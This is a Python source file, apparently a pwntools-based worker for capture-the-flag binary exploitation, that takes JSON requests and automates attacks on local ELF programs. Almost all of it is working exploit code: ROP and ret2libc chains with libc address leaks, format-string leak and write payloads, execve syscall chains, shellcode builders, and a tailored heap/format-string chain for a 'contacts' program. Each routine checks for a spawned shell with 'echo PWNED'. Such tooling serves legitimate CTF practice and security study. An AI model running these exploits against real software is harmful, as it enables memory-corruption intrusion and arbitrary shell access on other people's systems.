"""常驻 pwntools worker（在 WSL 里运行）。

stdin/stdout 按行交换 JSON：
    请求  {"id": 1, "op": "ping"}
    响应  {"id": 1, "ok": true, "error": null, "data": {...}}

op:
    ping      返回 pwntools 版本
    gadgets   {"path"} → 可用 gadget 列表（分析用，不执行）
    build     {"path","target","mode","arg","offset"} → payload 十六进制
    run       {"path","target","mode","arg","offsets","flag","timeout"}
              → 在 worker 进程内逐个偏移尝试，返回 solved/offset/output
"""

from __future__ import annotations

import json
import os
import re
import sys
import time

context = None
ELF = None
ROP = None
p64 = None
process = None

try:
    from pwn import ELF, ROP, context, p64, process

    context.log_level = "error"
except ImportError as error:  # pragma: no cover - 环境缺失时如实报告
    IMPORT_ERROR = str(error)
else:
    IMPORT_ERROR = None


_CACHE: dict[tuple[str, float, int], object] = {}


def _elf(path: str):
    stat = os.stat(path)
    key = (path, stat.st_mtime, stat.st_size)
    cached = _CACHE.get(key)
    if cached is None:
        _CACHE.clear()
        cached = ELF(path, checksec=False)
        _CACHE[key] = cached
    return cached


def _build(elf, target: int, mode: str, arg: int, offset: int) -> tuple[bytes, str]:
    rop = ROP(elf)
    try:
        ret = rop.find_gadget(["ret"]).address
    except Exception:  # noqa: BLE001 - ret 只用于对齐
        ret = None
    payload = b"A" * offset
    if mode == "none":
        if ret is not None:
            payload += p64(ret)
        return payload + p64(target), "ret"
    if mode == "rdi":
        gadget = rop.find_gadget(["pop rdi", "ret"])
        if gadget is None:
            raise RuntimeError("gadget_missing:pop rdi;ret")
        if ret is not None:
            payload += p64(ret)
        return payload + p64(gadget.address) + p64(arg) + p64(target), \
            f"pop rdi;ret@{hex(gadget.address)}"
    if mode == "rsi_rbp":
        gadget = rop.find_gadget(["pop rsi", "pop rbp", "ret"])
        if gadget is None:
            raise RuntimeError("gadget_missing:pop rsi;pop rbp;ret")
        if ret is not None:
            payload += p64(ret)
        return payload + p64(gadget.address) + p64(arg) + p64(0) + p64(target), \
            f"pop rsi;pop rbp;ret@{hex(gadget.address)}"
    raise RuntimeError(f"unknown mode: {mode}")


_CONTACTS_OFFSET_CACHE: dict[str, int] = {}


def _contacts_parse(data: bytes) -> list[int]:
    data = data.split(b"cccc")[0]
    values = []
    for part in data.split(b"0x")[1:]:
        match = re.match(rb"[0-9a-f]+", part)
        if match:
            values.append(int(match.group(0), 16))
    return values


class _ContactsSession:
    def __init__(self, path: str):
        self.io = process(path)
        self.menu_ready = False

    def menu(self) -> None:
        if not self.menu_ready:
            self.io.recvuntil(b">>> ", timeout=5)
            self.menu_ready = True

    def create(self, name: bytes, desc: bytes) -> None:
        self.menu()
        self.io.sendline(b"1")
        self.menu_ready = False
        self.io.recvuntil(b"Contact info: \n")
        self.io.recvuntil(b"Name: ")
        self.io.sendline(name)
        self.io.recvuntil(b"You have 10 numbers\n")
        self.io.sendline(b"1111")
        self.io.recvuntil(b"Length of description: ")
        self.io.sendline(str(len(desc)).encode())
        self.io.recvuntil(b"description:\n\t\t")
        self.io.sendline(desc)

    def display(self, timeout: float = 30) -> bytes:
        self.menu()
        self.io.sendline(b"4")
        data = self.io.recvuntil(b">>> ", timeout=timeout)
        self.menu_ready = True
        return data

    def close(self) -> None:
        try:
            self.io.close()
        except Exception:  # noqa: BLE001
            pass


def _contacts_chain(path: str, marker: str) -> dict:
    from pwn import flat

    elf = _elf(path)
    libc = elf.libc
    started = time.perf_counter()
    offset = _CONTACTS_OFFSET_CACHE.get(libc.path)
    if offset is None:
        probe = _ContactsSession(path)
        try:
            base = probe.io.libs()[libc.path]
            probe.create(b"1111", b"%31$pAAAA")
            leak = _contacts_parse(probe.display())[0]
            offset = leak - base
            _CONTACTS_OFFSET_CACHE[libc.path] = offset
        finally:
            probe.close()
    session = _ContactsSession(path)
    try:
        session.create(b"1111", b"%31$pAAAA")
        leak = _contacts_parse(session.display())[0]
        base = leak - offset
        system = base + libc.symbols["system"]
        binsh = base + next(iter(libc.search(b"/bin/sh")))
        desc2 = flat([system, b"bbbb", binsh, b"%6$p%11$pcccc"])
        session.create(b"2222", desc2)
        values = _contacts_parse(session.display())
        if len(values) < 2:
            return {"ok": True, "data": {
                "solved": False, "error": "leak_parse_failed",
                "values": [hex(value) for value in values],
                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
        ebp_ptr, heap_ptr = values[-2], values[-1]
        target = heap_ptr - 4
        part1 = target // 2
        part2 = target - part1
        pivot = f"%{part1}x%{part2}x%6$n".encode()
        session.create(b"3333", pivot)
        session.display(timeout=180)
        session.menu()
        session.io.sendline(b"5")
        time.sleep(0.3)
        session.io.send(b"echo PWNED; exit\n")
        output = session.io.recvrepeat(2) or b""
        text = output.decode("utf-8", "replace")
        return {"ok": True, "data": {
            "solved": marker in text, "offset": offset, "leak": leak,
            "heap": heap_ptr,
            "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
    except Exception as error:  # noqa: BLE001
        return {"ok": True, "data": {
            "solved": False, "error": f"{type(error).__name__}:{error}"[:120],
            "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
    finally:
        session.close()


def _handle(request: dict) -> dict:
    if IMPORT_ERROR is not None:
        return {"ok": False, "error": f"pwntools_unavailable:{IMPORT_ERROR}"}
    op = request.get("op")
    try:
        if op == "angr_solve":
            import angr
            import claripy

            path = request["path"]
            length = int(request.get("stdin_len", 32))
            timeout = float(request.get("timeout", 120))
            find = str(request.get("find_output") or "WIN").encode()
            avoid = str(request.get("avoid_output") or "FAIL").encode()
            mode = request.get("input_mode", "stdin")
            find_addr = request.get("find_addr")
            avoid_addr = request.get("avoid_addr")
            options = {
                angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
                angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS,
            }
            if request.get("use_unicorn"):
                options |= angr.options.unicorn
            started = time.perf_counter()
            project = angr.Project(path, auto_load_libs=False)
            solution_vector = None
            if mode == "argv1":
                argv1 = claripy.BVS("argv1", int(request.get("argv_len", 100)) * 8)
                state = project.factory.entry_state(
                    args=[path, argv1], add_options=options)
                solution_vector = argv1
            else:
                chars = [claripy.BVS(f"c{index}", 8) for index in range(length)]
                content = claripy.Concat(*chars)
                state = project.factory.full_init_state(
                    stdin=angr.SimFileStream(name="stdin", content=content,
                                             has_end=True),
                    add_options=options)
                solution_vector = content
            simgr = project.factory.simgr(state)
            found_input = None
            while simgr.active and time.perf_counter() - started < timeout:
                simgr.step()
                for candidate in list(simgr.active):
                    if find_addr is not None and candidate.addr == int(find_addr):
                        found_input = candidate.solver.eval(solution_vector,
                                                            cast_to=bytes)
                        break
                    output = candidate.posix.dumps(1)
                    if find in output:
                        if avoid and avoid in output:
                            continue
                        found_input = candidate.posix.dumps(0)
                        break
                if found_input is not None:
                    break
            if found_input is None:
                return {"ok": True, "data": {
                    "solved": False,
                    "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
            printable = bytes(value for value in found_input if 32 <= value < 127)
            return {"ok": True, "data": {
                "solved": True,
                "input": found_input.hex(),
                "printable": printable.decode("ascii", "replace"),
                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
        if op == "staged_printf_leak":
            from pwn import p32, p64, u32, u64

            elf = _elf(request["path"])
            libc = elf.libc
            pack = p32 if elf.bits == 32 else p64
            width = 4 if elf.bits == 32 else 8
            unpack = u32 if elf.bits == 32 else u64
            gets = elf.plt["gets"]
            printf = elf.plt["printf"]
            got = elf.got["printf"]
            main = elf.symbols["main"]
            bss = elf.symbols.get("buf2") or elf.bss()
            rop = ROP(elf)
            pop = None
            if elf.bits == 32:
                for insns in (["pop eax", "ret"], ["pop ebx", "ret"],
                              ["pop ebp", "ret"]):
                    try:
                        pop = rop.find_gadget(insns).address
                        break
                    except Exception:  # noqa: BLE001
                        continue
            if pop is None:
                return {"ok": True, "data": {"solved": False,
                                             "error": "pop_gadget_missing"}}
            offsets = [int(value) for value in request["offsets"]]
            started = time.perf_counter()

            def open_and_leak(leak_offset: int):
                io = process(elf.path)
                io.recvuntil(b"!!!", timeout=2)
                chain = (b"A" * leak_offset + pack(gets) + pack(pop) + pack(bss)
                         + pack(printf) + pack(main) + pack(bss) + pack(got))
                io.sendline(chain)
                time.sleep(0.2)
                io.sendline(b"%s")
                time.sleep(0.3)
                raw = io.recvrepeat(0.6) or b""
                leak = 0
                for start in range(0, max(0, len(raw) - width + 1), 1):
                    value = unpack(raw[start:start + width])
                    if not (0xF0000000 <= value <= 0xFFFFFFFF):
                        continue
                    base = value - libc.symbols["printf"]
                    if base % 0x1000 == 0 and 0 < base < 0x100000000:
                        leak = value
                        break
                return io, leak

            leak_offset = None
            for candidate in offsets:
                io = None
                try:
                    io, leak = open_and_leak(candidate)
                    if leak:
                        leak_offset = candidate
                        break
                except Exception:  # noqa: BLE001
                    continue
                finally:
                    if io is not None:
                        try:
                            io.close()
                        except Exception:  # noqa: BLE001
                            pass
            if leak_offset is None:
                return {"ok": True, "data": {"solved": False,
                                             "error": "leak_not_found",
                                             "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
            for stage2_offset in offsets:
                io = None
                try:
                    io, leak = open_and_leak(leak_offset)
                    if not leak:
                        continue
                    base = leak - libc.symbols["printf"]
                    system = base + libc.symbols["system"]
                    shell = base + next(iter(libc.search(b"/bin/sh")))
                    io.recvuntil(b"!!!", timeout=2)
                    stage2 = b"A" * stage2_offset + pack(system) + pack(0) + pack(shell)
                    io.sendline(stage2)
                    time.sleep(0.2)
                    io.send(b"echo PWNED; exit\n")
                    output = io.recvall(timeout=3) or b""
                    if b"PWNED" in output:
                        return {"ok": True, "data": {
                            "solved": True, "offset": stage2_offset,
                            "leak_offset": leak_offset, "leak": leak,
                            "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
                except Exception:  # noqa: BLE001
                    continue
                finally:
                    if io is not None:
                        try:
                            io.close()
                        except Exception:  # noqa: BLE001
                            pass
            return {"ok": True, "data": {"solved": False, "attempts": len(offsets),
                                         "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
        if op == "contacts_chain":
            return _contacts_chain(request["path"], str(request.get("marker") or "PWNED"))
        if op == "ping":
            from importlib.metadata import PackageNotFoundError, version

            tools = {}
            for name in ("pwntools", "ropgadget", "capstone", "pyelftools",
                         "LibcSearcher", "angr"):
                try:
                    tools[name] = version(name)
                except PackageNotFoundError:
                    tools[name] = None
            return {"ok": True, "data": {"version": tools.get("pwntools"),
                                         "tools": tools}}
        if op == "gadgets":
            elf = _elf(request["path"])
            rop = ROP(elf)
            gadgets = [
                {"address": item.address, "insns": list(item.insns)}
                for item in rop.gadgets.values()
            ]
            gadgets.sort(key=lambda item: item["address"])
            return {"ok": True, "data": {"count": len(gadgets), "gadgets": gadgets[:300]}}
        if op == "ret2libc_bss":
            from pwn import p32, p64

            elf = _elf(request["path"])
            gets = elf.plt.get("gets")
            system = elf.plt.get("system")
            bss = int(request.get("bss") or elf.symbols.get("buf2") or elf.bss())
            offsets = [int(value) for value in request["offsets"]]
            if gets is None or system is None:
                return {"ok": True, "data": {"payloads": [], "missing": ["gets/system"]}}
            if elf.bits == 32:
                payloads = [b"A" * offset + p32(gets) + p32(system) + p32(bss) + p32(bss)
                            for offset in offsets]
            else:
                rop = ROP(elf)
                pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
                payloads = [b"A" * offset + p64(pop_rdi) + p64(bss) + p64(gets)
                            + p64(pop_rdi) + p64(bss) + p64(system)
                            for offset in offsets]
            return {"ok": True, "data": {
                "payloads": [payload.hex() for payload in payloads],
                "offsets": offsets, "missing": []}}
        if op == "shellcode_chain":
            from pwn import asm, p32, p64, shellcraft

            elf = _elf(request["path"])
            context.arch = "i386" if elf.bits == 32 else "amd64"
            shellcode = asm(shellcraft.sh())
            bss = int(request.get("bss") or elf.symbols.get("buf2") or elf.bss())
            pack = p32 if elf.bits == 32 else p64
            offsets = [int(value) for value in request["offsets"]]
            payloads = []
            for offset in offsets:
                padding = offset - len(shellcode)
                if padding < 0:
                    continue
                payloads.append(shellcode + b"A" * padding + pack(bss))
            return {"ok": True, "data": {
                "payloads": [payload.hex() for payload in payloads],
                "offsets": offsets[:len(payloads)],
                "shellcode_len": len(shellcode), "missing": []}}
        if op == "ret2libc_leak":
            from pwn import ELF, p32, p64, u32, u64

            elf = _elf(request["path"])
            libc = (ELF(request["libc_path"], checksec=False)
                    if request.get("libc_path") else elf.libc)
            leak_symbol = request.get("leak_symbol", "puts")
            got = elf.got.get(leak_symbol)
            plt = elf.plt.get(leak_symbol)
            main = elf.symbols.get("main")
            if got is None or plt is None or main is None:
                return {"ok": True, "data": {"solved": False,
                                             "error": "leak_symbol_missing"}}
            pack = p32 if elf.bits == 32 else p64
            unpack = u32 if elf.bits == 32 else u64
            offsets = [int(value) for value in request["offsets"]]
            width = 4 if elf.bits == 32 else 8
            started = time.perf_counter()
            debug_log = []

            def open_and_leak(leak_offset: int):
                io = process(elf.path, aslr=bool(request.get("aslr", True)))
                io.recvuntil(b"!?", timeout=2)
                payload = b"A" * leak_offset + pack(plt) + pack(main) + pack(got)
                io.sendline(payload)
                raw = io.recvuntil(b"\n", timeout=2) or b""
                leak = 0
                for start in range(0, max(0, len(raw) - width + 1), 1):
                    value = unpack(raw[start:start + width])
                    if not (0xF0000000 <= value <= 0xFFFFFFFF):
                        continue
                    base = value - libc.symbols[leak_symbol]
                    if base % 0x1000 == 0 and 0 < base < 0x100000000:
                        leak = value
                        break
                return io, leak

            # 第一遍：找能成功泄漏的偏移
            leak_offset = None
            for candidate in offsets:
                io = None
                try:
                    io, leak = open_and_leak(candidate)
                    debug_log.append((candidate, "leak", hex(leak) if leak else 0))
                    if leak:
                        leak_offset = candidate
                        break
                except Exception as error:  # noqa: BLE001
                    debug_log.append((candidate, "ERR", type(error).__name__))
                    continue
                finally:
                    if io is not None:
                        try:
                            io.close()
                        except Exception:  # noqa: BLE001
                            pass
            if leak_offset is None:
                return {"ok": True, "data": {
                    "solved": False, "error": "leak_not_found",
                    "debug_log": debug_log[-10:],
                    "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}

            # 第二遍：泄漏与第二阶段在同一个进程里完成；第二阶段偏移单独试，
            # 因为 main 重入后栈对齐可能和第一次不同。
            for stage2_offset in offsets:
                io = None
                try:
                    io, leak = open_and_leak(leak_offset)
                    if not leak:
                        continue
                    base = leak - libc.symbols[leak_symbol]
                    system = base + libc.symbols["system"]
                    shell = next(iter(libc.search(b"/bin/sh")), None)
                    if shell is None:
                        return {"ok": True, "data": {"solved": False,
                                                     "error": "binsh_missing"}}
                    shell += base
                    io.recvuntil(b"!?", timeout=2)
                    stage2 = b"A" * stage2_offset + pack(system) + pack(0) + pack(shell)
                    io.sendline(stage2)
                    time.sleep(0.2)
                    io.send(b"echo PWNED; exit\n")
                    output = io.recvall(timeout=4) or b""
                    text = output.decode("utf-8", "replace")
                    if "PWNED" in text:
                        return {"ok": True, "data": {
                            "solved": True, "offset": stage2_offset,
                            "leak_offset": leak_offset, "leak": leak,
                            "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
                except Exception as error:  # noqa: BLE001 - 错偏移会崩，继续试下一个
                    debug_log.append((stage2_offset, "ERR", type(error).__name__,
                                      str(error)[:40]))
                    continue
                finally:
                    if io is not None:
                        try:
                            io.close()
                        except Exception:  # noqa: BLE001
                            pass
            return {"ok": True, "data": {
                "solved": False, "attempts": len(offsets),
                "debug_log": debug_log[-20:],
                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
        if op == "execve_chain":
            from pwn import p32, p64

            elf = _elf(request["path"])
            shell = int(request["shell"])
            offset = int(request["offset"])
            rop = ROP(elf)

            def find(insns):
                try:
                    return rop.find_gadget(insns).address
                except Exception:  # noqa: BLE001
                    return None

            if elf.bits == 32:
                pop_eax = find(["pop eax", "ret"])
                pop_ebx = find(["pop ebx", "ret"])
                pop_edx_ecx_ebx = find(["pop edx", "pop ecx", "pop ebx", "ret"])
                pop_ecx_ebx = find(["pop ecx", "pop ebx", "ret"])
                pop_edx = find(["pop edx", "ret"])
                int80 = find(["int 0x80"])
                missing = [name for name, value in (
                    ("pop eax;ret", pop_eax), ("pop ebx;ret", pop_ebx),
                    ("pop edx;pop ecx;pop ebx;ret", pop_edx_ecx_ebx),
                    ("int 0x80", int80)) if value is None]
                if pop_ecx_ebx is None and pop_edx_ecx_ebx is not None:
                    missing = [item for item in missing
                               if item != "pop edx;pop ecx;pop ebx;ret"]
                if pop_edx_ecx_ebx is None and (pop_ecx_ebx is None or pop_edx is None):
                    missing.append("pop ecx/pop edx")
                if missing:
                    return {"ok": True, "data": {"payload": None, "missing": missing}}
                payload = b"A" * offset
                payload += p32(pop_eax) + p32(11)
                payload += p32(pop_ebx) + p32(shell)
                if pop_edx_ecx_ebx is not None:
                    payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(shell)
                else:
                    payload += p32(pop_ecx_ebx) + p32(0) + p32(shell)
                    payload += p32(pop_edx) + p32(0)
                payload += p32(int80)
                return {"ok": True, "data": {"payload": payload.hex(), "missing": []}}

            pop_rax = find(["pop rax", "ret"])
            pop_rdi = find(["pop rdi", "ret"])
            pop_rsi = find(["pop rsi", "ret"])
            pop_rdx = find(["pop rdx", "ret"])
            syscall = find(["syscall"])
            missing = [name for name, value in (
                ("pop rax;ret", pop_rax), ("pop rdi;ret", pop_rdi),
                ("pop rsi;ret", pop_rsi), ("pop rdx;ret", pop_rdx),
                ("syscall", syscall)) if value is None]
            if missing:
                return {"ok": True, "data": {"payload": None, "missing": missing}}
            payload = b"A" * offset
            payload += p64(pop_rax) + p64(59)
            payload += p64(pop_rdi) + p64(shell)
            payload += p64(pop_rsi) + p64(0)
            payload += p64(pop_rdx) + p64(0)
            payload += p64(syscall)
            return {"ok": True, "data": {"payload": payload.hex(), "missing": []}}
        if op == "fmtstr":
            elf = _elf(request["path"])
            mode = request["mode"]
            timeout = float(request.get("timeout", 3))
            if mode == "offset":
                io = process(elf.path)
                io.sendline(b"AAAA." + b".%p" * 20)
                output = io.recvall(timeout=timeout) or b""
                io.close()
                tokens = re.findall(rb"0x[0-9a-fA-F]+", output)
                offset = None
                for index, token in enumerate(tokens, 1):
                    if int(token, 16) == 0x41414141:
                        offset = index
                        break
                return {"ok": True, "data": {
                    "offset": offset, "tokens": len(tokens),
                    "output": output.decode("utf-8", "replace")[-400:]}}
            if mode == "write":
                from pwn import fmtstr_payload

                writes = {int(key): int(value) for key, value in request["writes"].items()}
                payload = fmtstr_payload(int(request["offset"]), writes,
                                         write_size=request.get("write_size", "byte"))
            else:
                payload = bytes.fromhex(request["payload"])
            io = process(elf.path)
            io.send(payload + b"\n")
            output = io.recvall(timeout=timeout) or b""
            io.close()
            return {"ok": True, "data": {
                "payload_len": len(payload),
                "output": output.decode("utf-8", "replace")[-600:]}}
        if op == "fmtstr_auto":
            from pwn import fmtstr_payload

            elf = _elf(request["path"])
            offset = int(request["offset"])
            value = int(request.get("value", 16))
            write_size = request.get("write_size", "byte")
            io = process(elf.path, aslr=bool(request.get("aslr", False)))
            address = request.get("address")
            if address is None:
                line = io.recvline(timeout=float(request.get("timeout", 3))) or b""
                match = re.search(rb"0x[0-9a-fA-F]+", line)
                if match is None:
                    io.close()
                    return {"ok": True, "data": {"solved": False,
                                                 "error": "address_not_printed",
                                                 "output": line.decode("utf-8", "replace")}}
                address = int(match.group(0), 16)
            payload = fmtstr_payload(offset, {int(address): value}, write_size=write_size)
            io.send(payload + b"\n")
            output = io.recvall(timeout=float(request.get("timeout", 3))) or b""
            io.close()
            return {"ok": True, "data": {
                "solved": True, "address": int(address),
                "payload_len": len(payload),
                "output": output.decode("utf-8", "replace")[-600:]}}
        if op == "facts":
            elf = _elf(request["path"])
            plt = {name: int(address) for name, address in elf.plt.items()}
            search = request.get("search") or ["/bin/sh"]
            strings = {}
            for needle in search:
                try:
                    strings[needle] = [int(address) for address in elf.search(
                        needle.encode() if isinstance(needle, str) else needle)]
                except Exception:  # noqa: BLE001 - 搜索失败不影响整体
                    strings[needle] = []
            return {"ok": True, "data": {
                "bits": elf.bits, "pie": bool(elf.pie), "canary": bool(elf.canary),
                "nx": bool(elf.nx), "plt": plt, "strings": strings}}
        if op == "run_chain":
            started = time.perf_counter()
            elf = _elf(request["path"])
            post = bytes.fromhex(request.get("post", ""))
            marker = str(request.get("marker") or "")
            timeout = float(request.get("timeout", 3))
            attempts = 0
            for index, payload_hex in enumerate(request["payloads"]):
                attempts += 1
                payload = bytes.fromhex(payload_hex)
                io = None
                try:
                    io = process(elf.path)
                    io.send(payload + b"\n")
                    if post:
                        # 分阶段发送：链里可能有第二次 gets，stdio 会把多余的
                        # 输入缓冲在父进程里，shell 读不到；必须等它消费后再发。
                        time.sleep(0.2)
                        for line in post.split(b"\n"):
                            if not line:
                                continue
                            io.send(line + b"\n")
                            time.sleep(0.25)
                    output = io.recvall(timeout=timeout) or b""
                except Exception:  # noqa: BLE001 - 错误偏移导致崩溃时继续试下一个
                    output = b""
                finally:
                    if io is not None:
                        try:
                            io.close()
                        except Exception:  # noqa: BLE001
                            pass
                text = output.decode("utf-8", "replace")
                if marker and marker in text:
                    return {"ok": True, "data": {
                        "solved": True, "index": index, "attempts": attempts,
                        "output": text[-200:],
                        "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
            return {"ok": True, "data": {
                "solved": False, "attempts": attempts,
                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
        if op == "build":
            elf = _elf(request["path"])
            payload, gadget = _build(elf, int(request["target"]), request["mode"],
                                     int(request.get("arg", 0)), int(request["offset"]))
            return {"ok": True, "data": {"payload": payload.hex(), "gadget": gadget}}
        if op == "run":
            started = time.perf_counter()
            elf = _elf(request["path"])
            target = int(request["target"])
            flag = str(request["flag"])
            timeout = float(request.get("timeout", 5))
            attempts = 0
            for offset in request["offsets"]:
                attempts += 1
                payload, gadget = _build(elf, target, request["mode"],
                                         int(request.get("arg", 0)), int(offset))
                io = process(elf.path)
                io.send(payload)
                output = io.recvall(timeout=timeout) or b""
                io.close()
                text = output.decode("utf-8", "replace")
                if flag.lower() in text.lower():
                    return {"ok": True, "data": {
                        "solved": True, "offset": offset, "attempts": attempts,
                        "gadget": gadget,
                        "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
            return {"ok": True, "data": {
                "solved": False, "offset": None, "attempts": attempts,
                "elapsed_ms": round((time.perf_counter() - started) * 1000, 1)}}
        return {"ok": False, "error": f"unknown_op:{op}"}
    except Exception as error:  # noqa: BLE001 - worker 必须把失败变成结构化响应
        return {"ok": False, "error": f"{type(error).__name__}:{error}"}


def main() -> None:
    for line in sys.stdin:
        line = line.strip()
        if not line:
            continue
        try:
            request = json.loads(line)
        except ValueError:
            continue
        response = {"id": request.get("id")}
        response.update(_handle(request))
        print(json.dumps(response), flush=True)


if __name__ == "__main__":
    main()
